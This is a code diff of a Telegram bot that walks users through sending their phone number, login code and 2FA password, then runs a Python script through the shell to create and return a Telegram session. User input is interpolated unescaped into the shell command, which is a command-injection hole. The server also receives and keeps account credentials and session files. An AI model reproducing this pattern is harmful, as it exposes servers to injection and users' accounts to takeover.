@@ -1,6 +1,7 @@
 // index.js
 import { Telegraf } from "telegraf";
 import { exec } from "child_process";
+import fs from "fs";
 import express from "express";
 import dotenv from "dotenv";
 
@@ -10,40 +11,104 @@ const bot = new Telegraf(process.env.BOT_TOKEN);
 const API_ID = process.env.API_ID;
 const API_HASH = process.env.API_HASH;
 
-// ================== BOT HANDLER ==================
+const userState = {}; // Store per-user states
+
+// STEP 0: Start
 bot.start((ctx) => {
-  ctx.reply("👋 Welcome! Please send me your phone number (e.g. +1234567890).");
+  userState[ctx.chat.id] = {};
+  ctx.reply("👋 Welcome! Please send your phone number (+123...).");
 });
 
+// STEP 1: Handle messages
 bot.on("text", (ctx) => {
-  const phone = ctx.message.text.trim();
+  const userId = ctx.chat.id;
+  const msg = ctx.message.text.trim();
 
-  if (!phone.startsWith("+") || phone.length < 10) {
-    return ctx.reply("❌ Invalid phone number. Please send like +1234567890.");
+  // STEP 3: Handle 2FA password
+  if (userState[userId]?.waitingForPassword) {
+    ctx.reply("⏳ Verifying password...");
+    const { phone, otp } = userState[userId];
+    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${msg}`;
+
+    exec(command, (error, stdout) => {
+      if (error) return ctx.reply("❌ Verification failed.");
+
+      if (stdout.includes("SESSION_FILE")) {
+        ctx.reply("✅ Session generated!");
+
+        const filePath = `${phone}.session`;
+        if (fs.existsSync(filePath)) {
+          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
+        }
+
+        const match = stdout.match(/STRING_SESSION=(.+)/);
+        if (match) {
+          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
+        }
+      } else {
+        ctx.reply("❌ Failed to generate session.");
+      }
+
+      userState[userId] = {}; // reset
+    });
+    return;
   }
 
-  ctx.reply("⏳ Generating session, please wait...");
+  // STEP 2: Handle OTP
+  if (userState[userId]?.waitingForOtp) {
+    ctx.reply("⏳ Verifying OTP...");
+    const phone = userState[userId].phone;
+    const otp = msg;
+    const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;
 
-  const command = `python3 session.py ${API_ID} ${API_HASH} ${phone}`;
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error("Exec error:", error);
-      return ctx.reply("❌ Failed to generate session.");
-    }
+    exec(command, (error, stdout) => {
+      if (error) return ctx.reply("❌ OTP verification failed.");
 
-    const match = stdout.match(/STRING SESSION: (.+)/);
-    if (match && match[1]) {
-      ctx.reply(`✅ Your session:\n\n\`${match[1]}\``, { parse_mode: "Markdown" });
-    } else {
-      ctx.reply("❌ Could not extract session. Check logs.");
-    }
-  });
+      if (stdout.includes("NEED_2FA")) {
+        userState[userId] = { phone, otp, waitingForPassword: true };
+        return ctx.reply("🔒 Your account has 2FA enabled. Please send your password:");
+      }
+
+      if (stdout.includes("SESSION_FILE")) {
+        ctx.reply("✅ Session generated!");
+
+        const filePath = `${phone}.session`;
+        if (fs.existsSync(filePath)) {
+          ctx.replyWithDocument({ source: filePath, filename: `${phone}.session` });
+        }
+
+        const match = stdout.match(/STRING_SESSION=(.+)/);
+        if (match) {
+          ctx.reply(`🔑 String session:\n\`${match[1]}\``, { parse_mode: "Markdown" });
+        }
+      } else {
+        ctx.reply("❌ Failed to generate session.");
+      }
+
+      userState[userId] = {}; // reset
+    });
+    return;
+  }
+
+  // STEP 1: Handle phone number
+  if (msg.startsWith("+") && msg.length > 10) {
+    ctx.reply("📲 Sending OTP to your phone...");
+    const command = `python3 session.py ${API_ID} ${API_HASH} ${msg} request`;
+
+    exec(command, (error, stdout) => {
+      if (error || !stdout.includes("CODE_REQUESTED")) {
+        return ctx.reply("❌ Failed to send OTP.");
+      }
+
+      userState[userId] = { phone: msg, waitingForOtp: true };
+      ctx.reply("✅ OTP sent! Please enter the code you received:");
+    });
+  } else {
+    ctx.reply("❌ Please send a valid phone number (+123...).");
+  }
 });
 
-bot.launch();
-console.log("🚀 Bot is running...");
-
-// ================== EXPRESS SERVER ==================
+// ================= EXPRESS WEB STATUS =================
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -52,5 +117,8 @@ app.get("/", (req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`🌐 Web server running at http://localhost:${PORT}`);
+  console.log(`🌐 Status page running at http://localhost:${PORT}`);
 });
+
+bot.launch();
+console.log("🚀 Bot running...");
